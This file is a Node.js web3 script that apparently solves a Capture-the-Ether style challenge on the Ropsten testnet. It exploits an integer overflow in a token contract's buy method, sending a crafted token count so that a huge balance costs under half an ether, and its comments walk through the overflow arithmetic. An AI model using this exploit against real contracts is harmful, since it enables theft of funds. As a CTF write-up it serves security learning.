const Web3 = require('web3');
const fs = require('fs');
const abi = JSON.parse(fs.readFileSync("./abi.json"));
require('dotenv').config({ path: `${__dirname}/../.env` });

async function main() {
  const web3 = new Web3(
    new Web3.providers.HttpProvider(
      `https://ropsten.infura.io/v3/${process.env.INFURA_API_KEY}`
    )
  );

  const signer = web3.eth.accounts.privateKeyToAccount(
    process.env.PRIVATE_KEY
  );

  web3.eth.accounts.wallet.add(signer);

  const contract = new web3.eth.Contract(abi, "0x9E069e011b5284136FF9Dd07b1cdDc5e6011dF23");

  // This is quite complicated, as it's based on overflow hacking...
  // Remember that the contract `buy` method does the following:
  // `require(msg.value == numTokens * PRICE_PER_TOKEN);`.
  // `PRICE_PER_TOKEN` is "1 ether", but in wei, which is what the EVM uses here, it's 10^18, or "1,000,000,000,000,000,000".
  // So, the idea is to overflow the `numTokens * PRICE_PER_TOKEN` calculation.
  // Firstly, for a type of uint256, which the `numTokens` uses, the max number is massive: 2^256 - 1.
  // Or 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,936 - 1.
  // So the amount of wei in this big number is: 2^256 - 1 / 10^18:
  // -> 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457
  // If we send (2^256 - 1 / 10^18) + 1, it's more than the uint256 can store, and it'll overflow.
  // -> 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,458
  // So, if we send that, how much will it overflow by? Because that's how much wei we'll need to pay.
  // So, the total we plan to send is: ((2^256 - 1 / 10^18) + 1), as we know this will overflow:
  // -> `numTokens * PRICE_PER_TOKEN`, aka ((2^256 - 1 / 10^18) + 1) * 10^18:
  // -> 115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,458,000,000,000,000,000,000.
  // Now, to calculate how much this will overflow by, we substract away the big number (2^256 - 1).
  // In other words, (((2^256 - 1 / 10^18) + 1) * 10^18) - (2^256 - 1)
  // -> 415,992,086,870,360,065
  // However, we must minus 1, as when an overflow occurs, it first goes to 0, then increases from there:
  // -> 415,992,086,870,360,065 - 1 
  // -> 415,992,086,870,360,064
  // Now we have the overflow result: 415,992,086,870,360,064.
  // So, `numTokens * PRICE_PER_TOKEN` will result in `415,992,086,870,360,064` if `numTokens` is (2^256 - 1 / 10^18) + 1.
  // 415,992,086,870,360,064 is just under half an Ether.
  // So we'll have a lot of tokens in our balance, for only half an Ether.
  // Then we can sell 1 Ether afterwards, and be left with less than 1 Ether, completing the challenge!
  //
  // Useful: https://www.calculator.net/big-number-calculator.html

  const numTokens = web3.utils.toBN('115792089237316195423570985008687907853269984665640564039458');
  const tx = contract.methods.buy(numTokens);

  try {
    await tx.send({
      from: signer.address,
      gas: 350000,
      value: web3.utils.toWei("415992086870360064", "wei"),
    })
    .once('sending', function(payload) { 
      console.log('sending...');
    })
    .once('sent', function(payload) {
      console.log('sent');
    })
    .once('transactionHash', function(txHash) { 
      console.log('Mining transaction...');
      console.log(`https://ropsten.etherscan.io/tx/${txHash}`);
     })
    .once('receipt', function(receipt) {
      console.log(`Mined in block ${receipt.blockNumber}`);
    })
    .then(function(receipt) {
        console.log(`Mined in block ${receipt.blockNumber}`);
    });
  } catch (e) {
    console.log(e);
  }
};

main();
